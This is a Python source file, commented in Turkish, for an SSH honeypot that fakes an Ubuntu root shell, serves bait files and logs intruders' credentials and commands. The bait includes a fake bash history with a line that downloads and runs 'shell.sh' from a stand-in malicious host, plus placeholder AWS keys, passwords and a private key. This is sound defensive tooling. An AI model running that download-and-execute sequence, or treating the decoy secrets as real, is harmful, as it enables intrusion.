import threading
import socket
import paramiko
import sys
import os
import uuid
import shlex                  
from datetime import datetime 

# Proje kök dizinine erişim ayarları
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, '../../'))
sys.path.append(PROJECT_ROOT)

from concurrent.futures import ThreadPoolExecutor
from shared.database import log_attack, get_attempt_count

# GÜVENLİK LİMİTLERİ (Bellek koruması için bağlantı sayısı sınırı)
MAX_CONNECTIONS = 50

# RSA Key yükleme (Hata almamak için yol sabitlendi)
HOST_KEY = paramiko.RSAKey(filename=os.path.join(CURRENT_DIR, 'rsa_key'))
PORT = 2222 

class MirageSSHServer(paramiko.ServerInterface):
    def __init__(self, client_ip, session_id):
        self.event = threading.Event()
        self.client_ip = client_ip
        self.session_id = session_id

    def check_auth_password(self, username, password):
        # Her login denemesini yeni şemaya göre kaydet
        log_attack(
            ip_address=self.client_ip, 
            port=22, 
            module="SSH-Login", 
            username=username, 
            password=password, 
            user_agent="SSH-Client", 
            session_id=self.session_id,
            event_data=f"Auth Attempt: {username}",
            response_data="Permission denied",
            country_code="??" # İleride GeoIP ile güncellenecek
        )
        
        # Oturumdaki deneme sayısını kontrol et
        attempts = get_attempt_count(self.client_ip, self.session_id, "SSH-Login")
        
        # 3. denemede giriş başarısı (2 başarısız denemeden sonra)
        if attempts >= 3: 
            print(f"[*] SSH Access Granted for {username} [SID: {self.session_id}]")
            return paramiko.AUTH_SUCCESSFUL
        
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        if kind == 'session': return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

def handle_connection(client_sock, client_addr):
    session_id = str(uuid.uuid4())[:8]
    transport = paramiko.Transport(client_sock)
    transport.add_server_key(HOST_KEY)
    
    server = MirageSSHServer(client_addr[0], session_id)
    try:
        transport.start_server(server=server)
    except Exception:
        return

    chan = transport.accept(20)
    if chan is None: return

    server.event.wait(10)
    if not server.event.is_set():
        chan.close()
        return

    # --- SİSTEM DURUMU (STATE) ---
    current_path = "/root"
    command_history = []
    
    # SAHTE DOSYA SİSTEMİ İÇERİĞİ (TÜM ESKİ VE YENİ YEMLER)
    vfs = {
        # --- ESKİ /root DOSYALARI ---
        "/root/backup.sql": "-- MySQL dump 10.13\n-- Host: localhost\n-- Database: miragenet_db\nINSERT INTO `users` VALUES (1,'admin','$2y$10$vI8..');\n",
        "/root/.bash_history": "ls -la\ncd /etc\ncat passwd\nssh 192.168.1.50\nwget http://evil-malware.com/shell.sh\nchmod +x shell.sh\n./shell.sh\nrm shell.sh\nls -R /var/www\nexit\n",
        "/root/web-app/config.php": "<?php\n$db_user = 'root';\n$db_pass = 'S3cr3t_P@ss!';\n?>\n",
        "/root/web-app/index.php": "<?php echo 'MirageNet Web App is running!'; ?>\n",

        # --- YENİ EKLENEN KRİTİK YEMLER ---
        "/root/.ssh/id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA75Z5...[FAKE PRIVATE KEY]...75Z5\n-----END RSA PRIVATE KEY-----\n",
        "/root/.ssh/authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... backup-service\n",
        "/root/.aws/credentials": "[default]\naws_access_key_id = AKIA_FAKE_ID_2J3K4L5M6N7O8P9\naws_secret_access_key = wJalr_FAKE_SECRET_K7MDENG_bPxRfiCY\n",
        "/root/docker-compose.yml": "version: '3'\nservices:\n  app:\n    image: node:18\n    ports:\n      - \"3000:3000\"\n  db:\n    image: postgres:15\n    environment:\n      POSTGRES_PASSWORD: prod_password_2024\n",
        
        # --- WEB & APP SECRET'LAR ---
        "/var/www/html/index.php": "<?php echo 'Production Server v2.4.1'; ?>\n",
        "/var/www/html/.env": "DB_HOST=10.0.5.20\nDB_USER=prod_user\nDB_PASS=P@ssw0rd2024!\nSTRIPE_API_KEY=sk_dummy_4eC39HqLyjWDarjtT1zdp7dc\n",
        "/var/www/html/config.php": "<?php\n$db_user = 'root';\n$db_pass = 'S3cr3t_P@ss!';\n?>\n",
        "/var/www/html/.git/config": "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n[remote \"origin\"]\n\turl = https://github.com/miragenet-inc/main-app.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n",
        
        # --- SİSTEM DOSYALARI & LOGLAR ---
        "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsshd:x:100:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false\n",
        "/etc/shadow": "root:$6$v/9A9.zU$r5lU..../:18500:0:99999:7:::\ndaemon:*:18500:0:99999:7:::\nbin:*:18500:0:99999:7:::\n",
        "/etc/os-release": 'PRETTY_NAME="Ubuntu 22.04.3 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\nID=ubuntu\nID_LIKE=debian\n',
        "/etc/issue": "Ubuntu 22.04.3 LTS \\n \\l\n",
        "/etc/hostname": "prod-web-01\n",
        "/etc/hosts": "127.0.0.1\tlocalhost\n10.0.5.20\tdb-server\n10.0.5.31\tredis-cache\n",
        "/var/log/auth.log": f"{datetime.now().strftime('%b %d %H:%M:%S')} ubuntu sshd[1234]: Failed password for root from 185.12.34.56 port 4321 ssh2\n",
        "/var/log/syslog": f"{datetime.now().strftime('%b %d %H:%M:%S')} ubuntu kernel: [ 12.34] eth0: link up, 1000Mbps, full duplex\n",
        
        # --- /proc BİLGİLERİ ---
        "/proc/meminfo": "MemTotal:        8174548 kB\nMemFree:         4123564 kB\nMemAvailable:    6231456 kB\n",
        "/proc/cpuinfo": "model name\t: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz\ncpu cores\t: 2\n",
        "/proc/version": "Linux version 5.15.0-84-generic\n"
    }

    # Dinamik dizin seti oluştur
    directories = {
        "/", "/root", "/root/web-app", "/root/.ssh", "/root/.aws", "/etc", "/var", "/var/log", 
        "/var/www", "/var/www/html", "/var/www/html/.git", "/home", "/home/admin", 
        "/bin", "/sbin", "/usr", "/usr/bin", "/tmp", "/dev", "/proc", "/sys", "/boot"
    }
    
    # Yardımcı Fonksiyonlar
    def clean_path(path):
        # Basit os.path.normpath benzeri temizleme
        parts = path.split('/')
        new_parts = []
        for p in parts:
            if not p or p == '.': continue
            if p == '..':
                if new_parts: new_parts.pop()
            else:
                new_parts.append(p)
        return "/" + "/".join(new_parts)

    def get_abs_path(p):
        if p.startswith("/"): return clean_path(p)
        return clean_path(f"{current_path}/{p}")

    def list_dir(target_dir, show_hidden=False, long_format=False):
        files = []
        dirs = []
        
        # İçindekileri bul
        for d in directories:
            if d != target_dir and d.startswith(target_dir):
                sub = d[len(target_dir):].strip('/')
                if "/" not in sub and sub:
                    dirs.append(sub)
                    
        for f in vfs.keys():
            if f.startswith(target_dir):
                sub = f[len(target_dir):].strip('/')
                if "/" not in sub and sub:
                    files.append(sub)

        items = dirs + files
        if show_hidden:
            items = [".", ".."] + items
        else:
            items = [i for i in items if not i.startswith(".")]
            
        items = list(set(items))
        items.sort()

        if not items: return ""

        if long_format:
            output = f"total {len(items) * 4}\n"
            now_str = datetime.now().strftime("%b %d %H:%M")
            for item in items:
                is_d = (item in dirs) or (item in [".", ".."])
                perms = "drwxr-xr-x" if is_d else "-rw-r--r--"
                size = "4096" if is_d else str(len(vfs.get(f"{target_dir}/{item}".replace("//","/"), "")) + 10)
                output += f"{perms} 1 root root {size:>6} {now_str} {item}\n"
            return output
        else:
            return "  ".join(items) + "\n"

    # --- TİYATRO BAŞLIYOR ---
    chan.send("\r\nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)\r\n\r\n")
    chan.send(" * Documentation:  https://help.ubuntu.com\r\n")
    chan.send(" * Management:     https://landscape.canonical.com\r\n")
    chan.send(" * Support:        https://ubuntu.com/advantage\r\n\r\n")
    chan.send("Last login: " + datetime.now().strftime("%a %b %d %H:%M:%S %Y") + " from 192.168.1.100\r\n")
    
    # Zombi bağlantıları önlemek için boşta bekleme süresi (5 dakika)
    chan.settimeout(300.0)
    
    while True:
        display_path = current_path.replace("/root", "~")
        chan.send(f"root@ubuntu:{display_path}# ")
        
        command_line = ""
        while not command_line.endswith("\r"):
            chunk = chan.recv(1024).decode('utf-8', errors='ignore')
            if not chunk: return
            
            for char in chunk:
                # Backspace handling
                if char == '\x7f' or char == '\x08':
                    if len(command_line) > 0:
                        command_line = command_line[:-1]
                        chan.send('\x08 \x08')
                elif char in ('\x03', '\x04'): # Ctrl+C, Ctrl+D
                    chan.send("^C\r\n")
                    command_line = ""
                    break
                elif char.isprintable() or char == '\r' or char == '\n':
                    if char == '\n':
                        char = '\r'
                    chan.send(char)
                    command_line += char
                    
                    if char == '\r':
                        break
        
        if not command_line:
            continue

        full_cmd = command_line.strip()
        if not full_cmd:
            chan.send("\r\n")
            continue

        command_history.append(full_cmd)
        
        try:
            parts = shlex.split(full_cmd)
        except ValueError:
            parts = full_cmd.split() # Fallback for unclosed quotes
            
        cmd = parts[0] if parts else ""
        args = parts[1:] if len(parts) > 1 else []
        
        chan.send("\r\n")
        response = ""

        # --- KOMUT İŞLEME MANTIĞI ---
        
        if cmd == "exit" or cmd == "quit":
            chan.send("logout\r\n")
            chan.close()
            break

        elif cmd == "clear":
            response = "\x1b[2J\x1b[H"

        elif cmd == "pwd":
            response = f"{current_path}\n"

        elif cmd == "whoami":
            response = "root\n"

        elif cmd == "id":
            response = "uid=0(root) gid=0(root) groups=0(root)\n"

        elif cmd == "uname":
            flags = "".join([a.replace("-", "") for a in args if a.startswith("-")])
            if "a" in flags:
                response = "Linux ubuntu 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n"
            elif "r" in flags:
                response = "5.15.0-84-generic\n"
            else:
                response = "Linux\n"

        elif cmd == "ps":
            flags = "".join([a.replace("-", "") for a in args if a.startswith("-")])
            if "a" in flags or "e" in flags or "x" in flags:
                response = (
                    "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
                    "root           1  0.0  0.1 103292 11392 ?        Ss   Sep15   0:05 /sbin/init\n"
                    "root           2  0.0  0.0      0     0 ?        S    Sep15   0:00 [kthreadd]\n"
                    "root         893  0.0  0.0  12140  2480 ?        Ss   Sep15   0:00 sshd: /usr/sbin/sshd -D\n"
                    "root        1234  0.0  0.0  14568  3892 ?        Ss   12:00   0:00 sshd: root@pts/0\n"
                    "root        1235  0.0  0.0   7452  3412 pts/0    Ss   12:00   0:00 -bash\n"
                    "root        9982  0.0  0.0   8940  3296 pts/0    R+   12:01   0:00 ps -aux\n"
                )
            else:
                response = "    PID TTY          TIME CMD\n   1235 pts/0    00:00:00 bash\n   9982 pts/0    00:00:00 ps\n"

        elif cmd in ["ifconfig", "ip"]:
            response = (
                "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
                "        inet 172.31.25.10  netmask 255.255.240.0  broadcast 172.31.31.255\n"
                "        inet6 fe80::42:acff:fe1f:190a  prefixlen 64  scopeid 0x20<link>\n"
                "        ether 02:42:ac:1f:19:0a  txqueuelen 1000  (Ethernet)\n"
                "        RX packets 15403241  bytes 1245032488 (1.2 GB)\n"
                "        TX packets 1324141  bytes 34241412 (34.2 MB)\n\n"
                "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n"
                "        inet 127.0.0.1  netmask 255.0.0.0\n"
                "        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n"
                "        loop  txqueuelen 1000  (Local Loopback)\n"
                "        RX packets 2341  bytes 184234 (184.2 KB)\n"
                "        TX packets 2341  bytes 184234 (184.2 KB)\n"
            )
            
        elif cmd == "df":
            response = (
                "Filesystem     1K-blocks    Used Available Use% Mounted on\n"
                "/dev/sda1       40629144 1450230  39178914   4% /\n"
                "tmpfs            4087276       0   4087276   0% /dev/shm\n"
                "tmpfs             817456    1200    816256   1% /run\n"
            )

        elif cmd == "free":
            response = (
                "               total        used        free      shared  buff/cache   available\n"
                "Mem:         8174548     1705312     4123564        1200     2345672     6231456\n"
                "Swap:        2097148           0     2097148\n"
            )

        elif cmd == "history":
            for idx, h_cmd in enumerate(command_history):
                response += f" {idx+1:>4}  {h_cmd}\n"

        elif cmd == "echo":
            # Very basic echo
            output = " ".join(args)
            if ">" in output or ">>" in output:
                # Mock write to file
                op = ">>" if ">>" in output else ">"
                text, path = output.split(op, 1)
                text = text.strip().strip("'").strip('"')
                path = get_abs_path(path.strip())
                if op == ">" or path not in vfs:
                    vfs[path] = text + "\n"
                else:
                    vfs[path] += text + "\n"
            else:
                response = " ".join(args).replace('"', '').replace("'", "") + "\n"

        elif cmd == "touch":
            if args:
                path = get_abs_path(args[0])
                if path not in vfs:
                    vfs[path] = ""

        elif cmd == "rm":
            if args:
                path = get_abs_path(args[-1]) # ignores flags for now
                if path in vfs:
                    del vfs[path]
                elif path in directories:
                    response = f"rm: cannot remove '{args[-1]}': Is a directory\n"
                else:
                    response = f"rm: cannot remove '{args[-1]}': No such file or directory\n"

        elif cmd == "mkdir":
            if args:
                path = get_abs_path(args[0])
                directories.add(path)

        elif cmd == "ls":
            flags = "".join([a.replace("-", "") for a in args if a.startswith("-")])
            targets = [a for a in args if not a.startswith("-")]
            if not targets: targets = ["."]
            
            show_a = "a" in flags
            show_l = "l" in flags
            
            for target in targets:
                target_path = get_abs_path(target)
                if target_path in directories:
                    if len(targets) > 1: response += f"{target}:\n"
                    dir_content = list_dir(target_path, show_hidden=show_a, long_format=show_l)
                    response += dir_content
                elif target_path in vfs:
                    if show_l:
                        now_str = datetime.now().strftime("%b %d %H:%M")
                        size = str(len(vfs[target_path]))
                        name = target_path.split("/")[-1]
                        response += f"-rw-r--r-- 1 root root {size:>6} {now_str} {name}\n"
                    else:
                        response += f"{target}\n"
                else:
                    response += f"ls: cannot access '{target}': No such file or directory\n"

        elif cmd == "cd":
            target = args[0] if args else "~"
            if target == "~":
                current_path = "/root"
            else:
                target_path = get_abs_path(target)
                if target_path in directories:
                    current_path = target_path
                elif target_path in vfs:
                    response = f"-bash: cd: {target}: Not a directory\n"
                else:
                    response = f"-bash: cd: {target}: No such file or directory\n"

        elif cmd == "cat":
            if not args:
                pass # usually waits for stdin, we just do nothing
            else:
                for target in args:
                    target_path = get_abs_path(target)
                    if target_path in directories:
                        response += f"cat: {target}: Is a directory\n"
                    elif target_path in vfs:
                        response += vfs[target_path]
                    else:
                        response += f"cat: {target}: No such file or directory\n"

        elif cmd in ["wget", "curl"]:
            url = args[0] if args else "unknown"
            filename = url.split("/")[-1] if "/" in url else "index.html"
            vfs[get_abs_path(filename)] = "Downloaded content from " + url + "\n"
            response = f"--{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}--  {url}\n"
            response += "Resolving host... connected.\nHTTP request sent, awaiting response... 200 OK\n"
            response += f"Saving to: '{filename}'\n"

        elif cmd in ["sudo", "su"]:
            response = "su: Authentication failure\n" if cmd == "su" else "[sudo] password for root: \n"
        
        elif cmd in ["apt", "apt-get"]:
            response = "Reading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nE: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 1230 (unattended-upgr)\n"

        elif cmd == "systemctl" or cmd == "service":
            response = "System has not been booted with systemd as init system (PID 1). Can't operate.\n"
            
        elif cmd == "":
            pass # just newline print

        else:
            response = f"{cmd}: command not found\n"

        # Change Unix newlines to Windows ones expected by SSH client
        if response:
            response = response.replace("\r\n", "\n").replace("\n", "\r\n")
            chan.send(response)

        # ADLİ BİLİŞİM KAYDI
        log_attack(
            ip_address=client_addr[0],
            port=22,
            module="SSH-Command",
            username="root",
            password="N/A",
            user_agent="SSH-Terminal",
            session_id=session_id,
            event_data=full_cmd[:1000] + ("..." if len(full_cmd)>1000 else ""),       # Girdiği komut sınırı
            response_data=response[:1000] + ("..." if len(response)>1000 else ""), # Truncate for DB
            country_code="??"          
        )


def start_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', PORT)) 
    sock.listen(100)
    print(f"[*] MirageNet SSH Sensor listening on Port: {PORT}")
    print(f"[*] Connection Limit: {MAX_CONNECTIONS} concurrent sessions")

    # Thread havuzu kullanarak bellek kullanımını sınırla
    with ThreadPoolExecutor(max_workers=MAX_CONNECTIONS) as executor:
        while True:
            try:
                client, addr = sock.accept()
                executor.submit(handle_connection, client, addr)
            except Exception as e:
                print(f"[!] SSH Accept Error: {e}")

if __name__ == "__main__":
    start_server()